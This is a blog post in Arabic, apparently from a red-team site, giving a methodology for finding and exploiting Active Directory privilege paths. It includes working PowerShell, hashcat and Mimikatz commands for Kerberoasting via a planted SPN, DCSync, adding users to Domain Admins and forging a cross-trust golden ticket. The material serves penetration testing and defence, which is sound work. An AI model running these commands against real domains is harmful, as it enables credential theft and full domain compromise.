---
layout: blog
title: "مسارات الهجوم في Active Directory: منهجية عملية لاكتشاف واستغلال سلاسل الامتيازات"
date: 2026-04-04T17:42:52Z
category: "منهجية"
excerpt: "البيئات المؤسسية الحديثة تعتمد على Active Directory كعمود فقري للمصادقة والترخيص. لكن التعقيد البنيوي لهذه البيئات يخلق مسارات هجوم متعددة يستغلها المهاجمون للتصعيد من مستخدم عادي إلى Domain Admin. هذه المقالة تستعرض منهجية منظمة لرسم وتحليل Attack Paths، مع أدوات عملية وأمثلة واقعية من الميدان."
read_time: 8
tags: ["Active Directory", "Attack Paths", "BloodHound", "Privilege Escalation", "Red Teaming"]
slug: "ad-attack-paths"
image: "/OffsecAR/assets/images/blogs/ad-attack-paths.svg"
---

## فهم Attack Graphs والعلاقات الحرجة

مسارات الهجوم في Active Directory ليست ثغرات منفردة، بل سلاسل من العلاقات والصلاحيات المترابطة. المهاجم ينتقل عبر هذه السلسلة من نقطة دخول أولية إلى الهدف النهائي.

العلاقات الحرجة تشمل:
- **Group Membership**: انتماء المستخدمين لمجموعات ذات صلاحيات عالية
- **ACL Abuse**: صلاحيات GenericAll وWriteDACL على كائنات حساسة
- **Delegation Rights**: Unconstrained وConstrained Delegation
- **Local Admin Rights**: المستخدمين الذين لديهم صلاحيات محلية على أجهزة متعددة
- **GPO Control**: القدرة على تعديل Group Policy Objects

المفتاح هنا هو فهم أن كل علاقة تمثل احتمالية للانتقال. أداة مثل BloodHound تحول هذه العلاقات إلى graph قابل للتحليل.

## منهجية الاستكشاف والتعداد

الخطوة الأولى هي جمع البيانات عن البيئة. نستخدم SharpHound لجمع معلومات شاملة:

```powershell
# جمع كل البيانات من Domain
.\SharpHound.exe -c All --zipfilename corp_audit.zip

# جمع محدد لتقليل الضجيج
.\SharpHound.exe -c Session,LoggedOn,ObjectProps,ACL,Group,Trusts

# من Linux باستخدام bloodhound.py
bloodhound-python -u user@corp.local -p 'password' -ns 10.10.10.10 -d corp.local -c all
```

بعد رفع البيانات إلى BloodHound، نبدأ بالتحليل المنهجي:

1. **Find Shortest Paths to Domain Admins**: ابحث عن أقصر طريق من المستخدم الحالي
2. **Find Principals with DCSync Rights**: من يستطيع تنفيذ DCSync
3. **List all Kerberoastable Accounts**: حسابات قابلة لهجوم Kerberoasting
4. **Find AS-REP Roastable Users**: حسابات بدون Pre-Authentication

## استغلال ACL Misconfiguration

التكوينات الخاطئة في Access Control Lists هي المصدر الأكثر شيوعًا لمسارات الهجوم. لنفترض أن BloodHound أظهر أن المستخدم الحالي لديه `GenericWrite` على حساب لديه `GenericAll` على Domain Admins:

```powershell
# الخطوة 1: إضافة SPN للحساب الهدف لتمكين Kerberoasting
$target = "CN=ServiceAccount,OU=Users,DC=corp,DC=local"
Set-DomainObject -Identity $target -Set @{serviceprincipalname='fake/svc'}

# الخطوة 2: طلب TGS للحساب
Get-DomainSPNTicket -SPN 'fake/svc' | Export-Clixml ticket.xml

# الخطوة 3: كسر الهاش باستخدام Hashcat
hashcat -m 13100 hash.txt wordlist.txt --force

# الخطوة 4: استخدام البيانات المستخرجة
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'ouruser'
```

طريقة أخرى باستخدام `WriteDACL`:

```powershell
# منح نفسك DCSync rights
Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" -PrincipalIdentity user -Rights DCSync

# تنفيذ DCSync
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:corp.local /user:Administrator"'
```

## استغلال Trust Relationships

علاقات الثقة بين Domains تفتح مسارات هجوم جانبية. عند وجود bidirectional trust، يمكن استغلال SID History أو الانتقال عبر Foreign Group Membership:

```powershell
# استكشاف Trust Relationships
Get-DomainTrust -Domain corp.local
Get-DomainForeignGroupMember -Domain corp.local

# الحصول على Trust Key
Invoke-Mimikatz -Command '"lsadump::trust /patch"'

# إنشاء Golden Ticket عبر Trust
Invoke-Mimikatz -Command '"kerberos::golden /domain:corp.local /sid:S-1-5-21-... /sids:S-1-5-21-...-519 /rc4:trustkey /user:admin /service:krbtgt /target:external.local /ticket:trust.kirbi"'
```

المفتاح هنا هو فهم أن Enterprise Admins في Root Domain لديهم صلاحيات على كل Child Domains. أي path إلى EA يعني السيطرة الكاملة على Forest.

## أتمتة التحليل والاكتشاف المستمر

البيئات الديناميكية تتغير باستمرار. التحليل اليدوي غير كافٍ. نحتاج لأتمتة:

```python
# استخدام Neo4j Cypher مباشرة للاستعلامات المخصصة
from neo4j import GraphDatabase

class ADPathFinder:
    def __init__(self, uri, user, password):
        self.driver = GraphDatabase.driver(uri, auth=(user, password))
    
    def find_shortest_path(self, start_user, target_group):
        query = """
        MATCH (u:User {name: $start}),
              (g:Group {name: $target}),
              p = shortestPath((u)-[*1..]->(g))
        RETURN p
        """
        with self.driver.session() as session:
            result = session.run(query, start=start_user, target=target_group)
            return [record['p'] for record in result]
    
    def find_high_value_targets(self):
        query = """
        MATCH (u:User)-[r:MemberOf*1..]->(g:Group)
        WHERE g.highvalue = true
        RETURN u.name, collect(g.name) as groups
        """
        with self.driver.session() as session:
            return list(session.run(query))
```

أدوات إضافية للمراقبة المستمرة:
- **PingCastle**: تدقيق أمني شامل وتقييم المخاطر
- **Purple Knight**: فحص security posture من Semperis
- **ADRecon**: جمع معلومات شامل مع تقارير تحليلية

المنهجية الصحيحة تجمع بين الفحص الدوري والمراقبة المستمرة. كل تغيير في البيئة قد يخلق مسار هجوم جديد.
